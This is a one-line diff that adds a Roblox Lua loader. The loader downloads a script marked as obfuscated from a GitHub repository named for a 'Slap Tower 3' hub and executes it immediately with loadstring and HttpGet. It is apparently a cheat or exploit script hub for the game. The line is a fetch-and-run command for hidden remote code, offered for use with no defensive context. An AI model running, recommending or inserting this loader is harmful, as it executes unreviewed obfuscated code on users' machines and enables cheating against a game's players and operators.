@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/contateste8/ContaTesteHubSlapTower3/raw/refs/heads/main/ContaTesteHubSlapTower3Obf.txt"))()
